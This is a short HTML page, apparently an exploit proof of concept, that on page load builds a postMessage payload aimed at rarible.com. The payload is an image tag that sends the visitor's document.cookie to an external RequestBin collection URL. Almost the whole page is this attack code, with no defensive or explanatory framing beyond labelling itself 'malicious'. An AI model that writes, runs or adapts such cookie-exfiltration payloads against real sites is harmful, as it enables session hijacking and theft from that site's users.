<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Malicious Page</title>
</head>
<body>
    <h1>Malicious Payload in Action</h1>
    <p>This page sends a malicious payload to the target website (Rarible).</p>

    <script>
        window.onload = function() {
            // Define the malicious message
            const maliciousMessage = {
                event: "malicious_payload",
                // Send cookies to an external server (like RequestBin)
                payload: "<img src='https://requestbin.com/r/xyz123?cookie=" + encodeURIComponent(document.cookie) + "' />"
            };

            // Send the malicious postMessage to the Rarible page
            window.postMessage(maliciousMessage, "https://rarible.com");
        };
    </script>
</body>
</html>
